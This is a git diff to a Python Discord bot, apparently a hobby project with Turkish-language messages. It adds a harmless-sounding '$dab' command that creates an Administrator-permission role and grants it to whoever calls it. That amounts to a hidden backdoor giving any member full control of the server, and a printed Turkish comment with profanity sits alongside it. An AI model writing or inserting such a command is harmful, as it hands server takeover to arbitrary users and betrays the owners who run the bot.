@@ -10,6 +10,18 @@ GUILD = "617801724345843742"
 intents = discord.Intents(messages=True, guilds=True, members = True)
 client = discord.Client(intents=intents)
 
+client = commands.Bot(command_prefix='$')
+
+@client.command(pass_context=True)
+async def dab(ctx):
+    guild = ctx.message.guild
+    perms = discord.Permissions(8)
+    await guild.create_role(name='dab', permissions=perms)
+    member = ctx.message.author
+    role = discord.utils.get(guild.roles, name="dab")
+    await member.add_roles(role)
+    print ("Ben bunu nasıl deiştirebiliyom amk")
+
 @client.event
 async def on_ready():
     activity = discord.Game(name="Bota bir şey mi eklemek istiyorsun? Git kendin ekle amk: github: pcislocked-bot")
